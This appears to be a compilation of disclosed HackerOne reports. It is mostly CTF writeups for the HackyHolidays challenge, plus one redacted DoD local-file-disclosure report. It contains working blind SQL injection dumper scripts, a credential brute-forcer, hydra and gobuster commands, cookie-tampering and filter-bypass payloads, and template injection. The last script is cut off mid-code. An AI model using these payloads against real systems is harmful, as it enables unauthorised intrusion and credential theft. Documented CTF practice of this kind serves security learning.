The host will sometimes resolve first to 127.0.0.1, which results in the attack failing, since this is a local IP. If this happens we just wait 15s (because of the server only allowing one request per 15 second), and open the URL again. If we watch the result closely, we see that the server resolves the hostname to "203.0.113.33", one of the original targets of the attack, but when the server does another DNS lookup on the host, when launching the attack, the DNS rebinding will result in the host now resolving to the local address of 127.0.0.1. So the attack will be launch against the local attack box. After a short amount of time we are redirected to the following screen:

{F1138794}

And that is it! We have successfully infiltrated the Grinchs network and taken down his attack server and saved the holidays.

Flag 12 is: `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`

* * * 
# Appendix

## flag9-solver.py
```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import sys
import string
from bs4 import BeautifulSoup

headers = {
    "User-Agent": "<marquee>Hackerman-script</marquee>",
    "Content-type": "application/x-www-form-urlencoded"
}

charset = string.ascii_lowercase + string.digits + string.ascii_uppercase 
base_url = "https://hackyholidays.h1ctf.com/evil-quiz"

bf_list = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation

if len(sys.argv) != 1:
    print("(-) Usage: {} ".format(sys.argv[0]))
    sys.exit(1)

cookies=dict()

def get_session():
    response = requests.get(base_url, headers=headers, allow_redirects=False)
    return response.cookies['session']

def initiate_session():
    sessionid = get_session()
    global cookies
    cookies=dict(session=sessionid + ";")
    requests.post(base_url, data={"name":"test"}, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
    quiz_data = {
        "ques_1": "0",
        "ques_2": "0",
        "ques_3": "0"
    }
    requests.post(base_url + "/start", data=quiz_data, headers=headers, cookies=cookies, allow_redirects=False, verify=False)


def check_condition(condition):
    payload = "admin' and ({}) -- ".format(condition)

    data={
        "name": payload
    }

    requests.post(base_url + "/", data=data, headers=headers, verify=False, allow_redirects=False, cookies=cookies)

    score_response = requests.get(base_url + "/score", verify=False, cookies=cookies)
    soup = BeautifulSoup(score_response.text, 'html.parser')
    container = soup.findAll('div')
    last_div = container[len(container) - 1]

    if int(last_div.text.split(" ")[2]) > 0:
        return True
    else:
        return False

def get_number_of_tables():
    for x in range(1, 100):
        if check_condition("select (select count(*) from information_schema.tables)={}".format(x)):
            return x
    return None

def get_string_length():
    for x in range(80, 85):
        if check_condition("select CONVERT((select count(*) from information_schema.tables), DECIMAL)='{}'".format(x)):
            return x

def get_length_of_table_name(table_number):
    for x in range(0, 85):
        if check_condition("select length((select table_name from information_schema.tables order by create_time desc limit {},1))='{}'".format(table_number, x)):
            return x



def get_lastest_created_table_name(table_length):
    name = ""
    for index in range(0, table_length + 1):
        for char in charset:
            if check_condition("select substring((select table_name from information_schema.tables order by create_time desc limit 0,1), {},1)='{}'".format(index, char)):
                name += char
                break

    return name

def get_length_of_column_name_in_table(column_index, table_name):
    for x in range(1, 85):
        if check_condition("select length((select column_name from information_schema.columns where table_name='{}' limit {},1))='{}'".format(table_name, column_index, x)):
            return x

def get_number_of_columns_from_table(table_name):
    for x in range(1, 85):
        if check_condition("select CONVERT((select count(column_name) from information_schema.columns where table_name='{}'), DECIMAL)='{}'".format(table_name, x)):
            return x

def get_column_name(table_name, column_index):
    column_name = ""
    length_of_column = get_length_of_column_name_in_table(column_index, table_name)
    print("Length of column_index: {}, in table: {}, is: {} char(s)".format(column_index, table_name, length_of_column))
    for index in range(1, length_of_column+1):
        for char in charset:
            if check_condition("select ascii(substring((select column_name from information_schema.columns where table_name='{}' limit {},1), {},1))='{}'".format(table_name, column_index, index, ord(char))):
                column_name += char
                break
    return column_name

def count_rows_in(table_name):
    for x in range(1, 100):
        if check_condition("select CONVERT((select count(*) from {}), DECIMAL)='{}'".format(table_name, x)):
            return x
    return None

def get_length_of_value(table_name, column_name, row_index):
     for x in range(1, 100):
        if check_condition("select length((select {} from {} order by {} asc limit {},1))='{}'".format(column_name, table_name, column_name, row_index, x)):
            return x
            

def get_table_row_from_column(table_name, row_index, column):
    value = ""
    value_length = get_length_of_value(table_name, column, row_index)
    print("Column: {}, in table: {} with row_index {} is {} char(s) long".format(column, table_name, row_index, value_length))
    for x in range(1, value_length+1):
        for char in bf_list:
            if check_condition("select ascii(substring((select {} from {} limit {},1), {}, 1))='{}'".format(column, table_name, row_index, x, ord(char))):
                value += char
                break
    return value


if __name__ == "__main__":
    initiate_session()
    table_name = get_lastest_created_table_name(get_length_of_table_name(0))
    print("Found table {}. Fetching number of columns...".format(table_name))
    rows_in_table = count_rows_in(table_name)
    print("Table: {} contains {} row(s)".format(table_name, rows_in_table))
    number_of_columns = get_number_of_columns_from_table(table_name)
    print("Table: {} contains {} column(s). Fetching column names..".format(table_name, number_of_columns))
    

    columns = []
    for x in range(0, number_of_columns):
        column_name = get_column_name(table_name, x)
        print("Found column: {} in table {}. Fetching content".format(column_name, table_name))
        column_value = get_table_row_from_column(table_name, 0, column_name)
        print("Column: {} in table: {} has value: {}".format(column_name, table_name, column_value))

```


## flag11-bf.py
```python
import requests
from bs4 import BeautifulSoup
import base64
import string

charset = string.ascii_lowercase + string.digits

base_url ="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-"

def get_username():
    username = ""
    while True:
        found_char_previous_run = False
        for char in charset:
            test_string = username + char
            path = "../api/user?username={}%25".format(test_string)
            url = base_url.format(path)
            if is_invalid_content_type(url):
                username += char 
                print(char, flush=True, end='')
                found_char_previous_run = True
                break
        
        if not found_char_previous_run:
            break
    return username

def get_password(username):
    password = ""
    while True:
        found_char_previous_run = False
        for char in charset:
            test_string = password + char
            path = "../api/user?username={}%26password={}%25".format(username, test_string)
            url = base_url.format(path)
            if is_invalid_content_type(url):
                password += char 
                print(char, flush=True, end='')
                found_char_previous_run = True
                break
        
        if not found_char_previous_run:
            break
    return password



def is_invalid_content_type(url):
    response = requests.get(url) 
    soup = BeautifulSoup(response.text, 'html.parser')
    all_img = soup.find_all(class_="img-responsive")
    interesting_image_src = all_img[1]['src']

    image_url = "https://hackyholidays.h1ctf.com{}".format(interesting_image_src)
    image_resp = requests.get(image_url)
    if image_resp.text == "Invalid content type detected":
        return True
    else:
        return False


username = get_username()
print("\nUsername is: {}".format(username))
password = get_password("grinchadmin")
print("\nThe password is: {}".format(password))
```

## md5cracker.py
```python
import hashlib
import sys

if len(sys.argv) != 2:
    print("(-) Usage: {} <WORDLIST>".format(sys.argv[0]))
    sys.exit(1)

wordlist = []

with(open(sys.argv[1], "r", encoding='ISO-8859-1')) as fp:
    for x in fp:
        wordlist.append(x.strip())

hashs = [
    "5f2940d65ca4140cc18d0878bc398955",
    "2814f9c7311a82f1b822585039f62607",
    "5aa9b5a497e3918c0e1900b2a2228c38",
]

ips = [
    "203.0.113.33",
    "203.0.113.53",
    "203.0.113.213"
]

for word in wordlist:
    for ip in ips:
        combined_word_ip = word+ip
        calculate_hash = hashlib.md5(combined_word_ip.encode('utf-8')).hexdigest()
        if calculate_hash in hashs:
            print("Got a hit for word: {} on hash: {} for ip {}".format(word, calculate_hash, ip))
```


* * *

## Impact

We have successfully infiltrated the Grinch Networks and taken them down! Effectively saving the holidays!

---

### [Local File Disclosure on the ████████ (https://████/) leads to the source code disclosure & DB credentials leak](https://hackerone.com/reports/685344)

- **Report ID:** `685344`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T21:53:16.766Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
I discovered another LFD on the https://████/ (virtual host on the █████ IP)

##POC
https://█████/file.ashx?path=web.config
will download the website configuration file.
It exposes different DB credentials than in previous reports:
███

Similarly, attacker able to get content of any server-side file, such as source code of application:
https://███/file.ashx?path=index.aspx

## Impact

Source code & sensitive configuration data leakage. Attacker can use it to compromise the resource.

---

### [[H1 hackyholidays] CTF Writeup](https://hackerone.com/reports/1069171)

- **Report ID:** `1069171`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** h1-ctf
- **Reporter:** @macasun
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T17:59:35.162Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team,
Here is my CTF writeup for HackyHolidays.

# Main page

The main page doesn't contain any interesting stuff, just a few assets. Maybe we will find some known files in webapp root: `index.php`, `.htaccess`, `robots.txt`, ...? [robots.txt](https://hackyholidays.h1ctf.com/robots.txt) file exists, and there is the first flag:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

Also, there is a link to a hidden page `/s3cr3t-ar3a`. The source code of the page doesn't contain the flag, but it contains something interesting. First of all, there is `div` element with unused `alert` id (there are no css styles or scripts on the page where this id is used). Besides of this, jQuery library is loaded from the Grinch server, instead of public CDN (like as bootstrap css and js files):

- https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css
- https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js
- /assets/js/jquery.min.js

Searching for the string `alertbox` in /assets/js/jquery.min.js gives us the following code:

```js
h1_0 = 'la',
h1_1 = '}',
h1_2 = '',
h1_3 = 'f',
h1_4 = 'g',
h1_5 = '{b7ebcb75',
h1_6 = '8454-',
h1_7 = 'cfb9574459f7',
h1_8 = '-9100-4f91-';
document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
```

To get the flag, let's copy and run the code above in the browser console (will replace `document.getElementById...` to `console.log(h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1)`).

Another way to get the second flag, open the browser inspector, and search for *flag* or select `div#alertbox` element. The flag will be in `data-info` attribute.

- The 1st flag: `flag{48104912-28b0-494a-9995-a203d1e261e7}`.
- The 2nd flag: `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`.

# People Rater

This app allows us to see how Grinch rates (hates:)) people.

There are two endpoints:
- `/page/:pageId` - returns the list of people
- `/entry?id=:id` - returns details about selected man

The most interesting endpoint here is `/entry`, the `id` parameter value is a base64 encoded string. For the first man, *Tea Avery*, it's `eyJpZCI6Mn0=` and decoded value is `{"id":2}`. It looks interesting, why id for the first man starts from 2, instead of 1? Let's check what the server will return for man with id=1.
1. JSON: `{"id":1}`.
2. base64 encoded string: `eyJpZCI6MX0=`.
2. Send request: `curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0%3D`.

The response will contain details about the Grinch's user and the flag:
```json
{
    "id":"eyJpZCI6MX0=",
    "name":"The Grinch",
    "rating":"Amazing in every possible way!",
    "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}
```

- The 3rd flag: `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`.

# Swag Shop

There is a simple app with products, where we can purchase any product, but to do that we must be logged in.

The app has four known API endpoints (most of them we can find in inline javascript):
- `GET /api/stock` - returns list of products
- `POST /api/purchase` - buy a product, authentication required
- `POST /api/login` - log in
- `GET /checkout` - opens or redirects to the check page?

Let's try to find more (hidden) endpoints. To do that let's run `gobuster` tool in *dir* mode:
```bash
$ gobuster dir -u https://hackyholidays.h1ctf.com/swag-shop/api -w raft-small-directories.txt -t 50
```

`gobuster` will find two new endpoints:

- `/user` returns an error, if it's called without any parameter: `{"error":"Missing required fields"}`. Looks like it returns some information about a provided user.
- `/sessions` returns JSON object with a list of strings encoded in base64:

```json
{
  "sessions": [
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ=="
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
  ]
}
```

Each decoded session is JSON object with two fields: `user` and `cookie`. In most of them, `user` value is `null`, and only one has not null `user`:
```json
{
  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
```

Now, when we found user id, we can try to send it to `/api/user`, but we don't know the parameter name. To find it, let's run `gobuster` again, but now in *fuzz* mode:
```bash
$ gobuster fuzz -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 -w raft-small-words.txt -b 400 -t 50
```

And it will find the valid parameter name:
```
Found: [Status=200] [Length=216] https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
```

`curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043` will return the Grinch's user details in JSON format with the flag:

```json
{
  "uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username":"grinch",
  "address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},
  "flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

- The 4th flag `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`.

# Secure Login

There is an app where we can log in. When we provide any username/password combination, server returns *Invalid Username* error message. I suppose, that server returns the different error messages for invalid username and password:

- When username is invalid, the error message is *Invalid Username*.
- When password is invalid, the error message is *Invalid Password*.

Using this information, let's run `hydra` tool to find the valid username, and using it, the valid password.
```bash
# find username
$ hydra -L ./names.txt -p pass hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:F=Invalid Username" -t 50 -I -f

# find password for username `access`
$ hydra -l access -P ./10k-most-common.txt hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:F=Invalid Password" -t 50 -I -f
```

`hydra` will find the valid credentials for us: `access`/`computer`.

Now, let's try to log in using them. The server will return `securelogin` cookie and the message in the body: *No Files To Download*. It seems that we haven't enough permissions to see the private data. Let's look at `securelogin` cookie. It's base64 encoded string: `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`, decoded value is json object: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`. Let's change `admin:false` to `admin:true` and encode json to base64: `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==`. Now we will curl the url again, using the new cookie:

```bash
$ curl https://hackyholidays.h1ctf.com/secure-login -H "cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d"
```

The response body will contain a link to some secure zip file:
```html
<td><a href="/my_secure_files_not_for_you.zip">my_secure_files_not_for_you.zip</a></td>
```

Let's download it and try to open:
```bash
$ wget https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip -O /tmp/data.zip && unzip /tmp/data.zip
```

The archive is protected by password. To find the password we will use `John the Ripper` tool:
```bash
# create hash
$ zip2john /tmp/data.zip > /tmp/data.zip.hashes
# crack password
$ john /tmp/data.zip.hashes
```

`John` will find the password: `hahahaha`. Now unzip archive using the found password:

```bash
$ unzip sec-files.zip 
Archive:  sec-files.zip
[sec-files.zip] xxx.png password: 
  inflating: xxx.png
 extracting: flag.txt
```

And the flag will be in flag.txt file.

- The 5th flag: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`.

# My Diary

There is a calendar with Grinch's plans for December. The app url contains an interesting parameter `?template=entries.html`. Looks like that *Local/Remote file inclusion* attack is possible here. Awesome! Let's read content of `/etc/passwd`... But we can't, the server redirects us to `/my-diary/?template=entries.html` in most of the cases. It seems that it removes some letters from the template value before reading the file.

Ok, then let's try to find the hidden files in the app, we will run `gobuster` in *fuzz* mode using the list of web-content files:
```bash
$ gobuster fuzz -u https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ -t 50 -w raft-small-files.txt -b 302
```

`gobuster` will find `index.php` file with the following content:

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Now we see, that server really deletes all chars except ASC II letters, numbers and dots. And also it has `secretadmin.php` page, and there is some protection from reading its content.

Let's look at `str_replace` php function. It replaces all occurrences of the pattern in the input string. So `str_replace("admin.php", "", $page)` will return an empty string for the input `admin.php` or `admin.phpadmin.php`, **but**, if we inject the second `admin.php` somewhere in `admin.php`, the result will be `admin.php`:
```php
echo str_replace("admin.php", "", "admin.php"); // returns ""
echo str_replace("admin.php", "", "admiadmin.phpn.php"); // returns "admin.php"
```

To bypass the both conditions, we need to include `admin.php` and `secretadmin.php` twice, in the input string:

1. input string: `secretadmisecretaadmin.phpdmin.phpn.php`
2. after the first replace it becomes: `secretadmisecretadmin.phpn.php`
3. after the second replace it becomes: `secretadmin.php`

And `https://hackyholidays.h1ctf.com/my-diary/?template=secretadmisecretaadmin.phpdmin.phpn.php` returns the flag:

{F1138105}

- The 6th flag: `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`.

# Hate Mail Generator

In this app we can create (in fact we cannot:() and preview email campaigns. There is already created a single campaign with name *Guess What*. 

Take a look at *Guess What* campaign:
- name: `Guess What`
- subject: `Guess What...`
- markup: `{{template:cbdj3_grinch_header.html}}Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}`

As we see, markup is written on some template language, there we can use fields from a dictionary, and include html templates via `template:` prefix followed by file name.

Cool, it looks pretty easy! We can read content of any file using `{{template:<file-name>}}` directive, right!? Let's read content of the magic `flag.txt` file!!! **In fact we cannot:(**! The server removes everything from `file-name`, except letters, numbers, dash, dot and underscore. And after that, adds the trimmed `file-name` to `/templates/` path.

Let's check the content of `/templates` folder, besides of the two known templates: `cbdj3_grinch_header.html` and `cbdj3_grinch_footer.html`, it contains the very interesting file `38dhs_admins_only_header.html`:

- `cbdj3_grinch_header.html`
- `cbdj3_grinch_footer.html`
- `38dhs_admins_only_header.html`

The server doesn't allow read any of these files directly, and when we include `38dhs_admins_only_header.html` in a new campaign markup, it returns an *Access denied* error. So we need to find another way how to read content of the admin template.

Let's look at new email campaign. It's impossible to create own campaign, the server returns an error message informing us about running out of credits. But we can preview our campaign. With the default data, the client sends two parameters in the body:
- `preview_markup`: `{{name}}`
- `preview_data`: `{"name":"Alice","email":"alice@test.com"}`

The template engine on the server uses our markup and dictionary. The most known server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed by server-side. Let's try to inject template engine directive `{{template:}}` into the template to bypass the access restrictions and read content of `38dhs_admins_only_header.html` file.

Preview a new campaign with the following data:
- `markup`: `{{payload}}`
- `data`: `{"payload":"{{template:38dhs_admins_only_header.html}}"}`

And finally, the server returns the content of `38dhs_admins_only_header.html` with the flag:

{F1138104}

- The 7th flag: `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`.

# Forum

There are some public and private posts in the forum app. The post with id=1 has two comments. Also there is `/login` page. We can't create own posts or add any comment to existing ones.
Let's run `gobuster` in *dir* mode to find the hidden pages:

```bash
$ gobuster dir -u https://hackyholidays.h1ctf.com/forum -w raft-small-directories.txt -t 50
```

- `/login`
- `/phpmyadmin`
- `/1`
- `/2`

And we see new `/phpmyadmin` page here. Unfortunately for us (hackers), and fortunately for site creators:), we can't use bruteforce attack here to find the valid login/password combination. Both pages `/login` and `/phpmyadmin` return the universal error message when the credentials are incorrect: *Username/Password Combination is invalid* and *Invalid username and password combination*.

So what to do? Let's start from the beginning and check the challenge details on [Twitter](https://twitter.com/Hacker0x01/status/1340280729129734144). The first comment contains information about the challenge creator - @adamtlangley. Googling this name, gives us the link to his GitHub account. There are two interesting repositories:
- https://github.com/adamtlangley/framework
- https://github.com/adamtlangley/stuff

The first one looks like a codebase for the current forum app. The second one is md5 cracker tool. This cracker tool was the wrong goal :(, I spent some time and found the encrypted password: `2901197737pepper` for the provided hash, but it didn't work on both login pages.

So one hope to the framework repo. The latest commit doesn't have any interesting things. But there are some nice changes in the commit [small fix](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae):
```php
static public function read(){
    if( gettype(self::$read) == 'string' ) {
        - self::$read = new DbConnect( false, 'forum', 'forum', '6HgeAZ0qC9T6CQIqJpD' );
        + self::$read = new DbConnect( false, '', '', '' );
    }
    return self::$read;
}
```

It looks like, that `forum` and `6HgeAZ0qC9T6CQIqJpD` are login/password for the forum and they were deleted in that commit.

Let's try to log in to `/phpmyadmin` using the found credentials. 
Yes! We logged in successfully. In phpmyadmin we see `forum` database and four tables: `comment`, `post`, `section` and `user`:

{F1138106}

We can't access almost all of them, except `user`:

```
|id | username | password                         | admin
|1  | grinch   | 35D652126CA1706B59DB02C93E0C9FBF | 1
|2  | max      | 388E015BC43980947FCE0E5DB16481D1 |
```

The table contains two users, *grinch* is admin, the passwords are md5 hashes. We can try to use `hashcat` tool to find the password, but firstly, let's try to find it on the web by hash. And we see it here: [https://md5.gromweb.com/?md5=35d652126ca1706b59db02c93e0c9fbf](https://md5.gromweb.com/?md5=35d652126ca1706b59db02c93e0c9fbf), the password is `BahHumbug` (it's on the line 365139 in rockyou.txt, but in the wrong case, no chances to bruteforce at all :))

Now, let's log in with `grinch/BahHumbug` on `/login` page. And finally we have access to the private, admin posts. There is only one post and it contains the flag:

{F1138107}

- The 8th flag: `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`.

# Evil Quiz

In this app we must provide a name and the answers to three questions, and the system will calculate our score and gives us a hint how many users there with the same name.

Let's check what app will return for the same unique name *1asdsa2asda32asdsa1ds32*, posted twice (will clean cookies between posts). In the first case the number of the users with  this name will be 0, in the second case 1. What does this mean? It means, that on the server side, there is a SQL query, that looks like: `SELECT COUNT(*) FROM users WHERE name='input_name'`. Maybe SQL injection is possible in this query? Let's check it, with the following payload: `' or 1=1 -- `, the number of the users on the last step will be 40561! So the app is vulnerable to SQLi.

When we play a game, the client sends three mandatory requests in the following order:

- `POST /evil-quiz` with name
- `POST /start` with answers
- `GET /score`

The requests must be send in the order shown above. Because of this, we can't use well known `sqlmap` tool, because these three requests must be send each after another, and the injection result is available only on the last step.

Let's create own python script that will dump database, and possibly, will give us username and password to log in. The algorithm of work looks like:

1. Send `GET` request to `/evil-quiz` to generate new cookies.
2. Send `POST` request to `/evil-quiz` with payload in name field.
3. Send `POST` request to `/start` with default answers.
4. Grep the response body for `There is (\d+) other` and select the number. If the value is greater than 0, then the injection result is positive.

To exclude the possible matches, we need to use the really random name `jghuyqhfyxjgh123` to be sure that nobody is using it yet.

Let's create a few payloads. To get schema name, table names and table column names, we will use payload with case insensitive  `LIKE` operator. To get password, we will use case sensitive `LIKE BINARY` operator. To decrease the number of requests, unused characters from the charset will be excluded.

1. Get schema name:
   1. `select count(*) from information_schema.schemata where schema_name != "information_schema" and schema_name like "' + tmp_known + '%" limit 1`
2. Get table name with users in schema *quiz*:
   1. `select count(*) from information_schema.tables where table_schema like "quiz" and table_name like "' + tmp_known + '%" limit 1`
3. Get column names in the *admin* table:
   1. `select count(*) from information_schema.columns where table_schema like "quiz" and table_name="admin" and column_name like "' + tmp_known + '%" limit 1`
   2. ``select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id") and column_name like "' + tmp_known + '%" limit 1`
   3. `select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id","password") and column_name like "' + tmp_known + '%" limit 1`
4. Get record values in *admin* table:
   1. `select count(*) from quiz.admin where username like "' + tmp_known + '%" limit 1`
   2. ``select count(*) from quiz.admin where username="admin" and password like binary "%' + temp_char + '%" limit 1`
   3. `select count(*) from quiz.admin where username="admin" and password like binary "' + tmp_known + '%" limit 1`

Python script to dump db:

```python
import requests as req
import string
import re

QUIZ_URL = 'https://hackyholidays.h1ctf.com/evil-quiz'
START_URL = 'https://hackyholidays.h1ctf.com/evil-quiz/start'
POST_HEADERS = {
  'Content-Type': 'application/x-www-form-urlencoded'
}

def send_sqli(query):
  session = req.session()
  session.get(QUIZ_URL) # to generate cookies
  session.post(
    QUIZ_URL,
    headers=POST_HEADERS,
    data={'name': 'jghuyqhfyxjgh123' + query}
  )
  res = session.post(
    START_URL,
    headers=POST_HEADERS,
    data='ques_1=0&ques_2=0&ques_3=0'
  )
  count_match = re.search(r'There is (\d+) other', res.text)
  if count_match:
    return int(count_match.group(1)) > 0
  print('Match not found')
  exit(0)

def get_charset():
  charset = ''
  base_charset = string.digits + string.ascii_letters + string.punctuation + ' '
  for char in base_charset:
    temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char

    query = 'select count(*) from quiz.admin where username="admin" and password like binary "%' + temp_char + '%" limit 1'
    query = '\' or ({}) = 1 -- '.format(query)
    print(query)

    if (send_sqli(query)):
      charset += char
      print(char)
  return charset

def get_data():
  known = ''
  known_max_len = 20
  charset = get_charset()
  print(charset)
  while True:
    found_next = False
    for char in charset:
      temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char
      tmp_known = known + temp_char

